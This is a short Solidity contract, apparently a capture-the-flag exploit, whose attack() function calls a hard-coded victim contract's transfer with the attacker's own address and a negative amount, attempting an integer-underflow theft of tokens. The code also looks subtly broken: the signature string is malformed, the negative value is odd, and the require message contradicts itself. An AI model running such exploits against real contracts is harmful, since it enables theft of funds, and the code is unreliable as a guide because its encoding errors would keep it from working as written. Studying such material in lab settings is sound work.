// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract Token {
    address victim = 0x629Fdb32e4a50919E3940eCC95033fa9E49FA98E;
    address mine = 0x71665B951a9EB87c8e6A8EF29a266fA578a78654;

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("transfer(address, uint)", mine, -22);
        (bool success, ) = victim.call{value: 0}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}